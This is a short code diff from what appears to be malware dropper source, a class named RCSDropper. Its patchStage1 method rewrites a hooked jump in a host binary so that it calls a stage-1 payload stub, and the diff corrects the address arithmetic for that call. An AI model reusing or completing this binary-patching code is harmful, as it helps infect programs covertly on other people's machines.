@@ -36,14 +36,15 @@ static void rc4crypt(
 void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD jumpToVA)
 {
     (void) VA;
-
+    
     AsmJit::Assembler stub;
-
+    
     disassembled_instruction instr = hookedInstruction_;
     switch (instr.d.Instruction.BranchType) {
         case JmpType:
         {
-            DWORD addr = ((DWORD) instr.d.EIP) + (jumpToVA + sizeof(DWORD) - instr.d.VirtualAddr);
+            DWORD addr = ((DWORD) instr.d.EIP) + (jumpToVA - instr.d.VirtualAddr);
+            addr += sizeof(DWORD); // account for initial 4 bytes containing address of next byte
             cout << "Stage1 stub: call 0x" << hex << jumpToVA << dec << std::endl;
             stub.call(addr);
         }
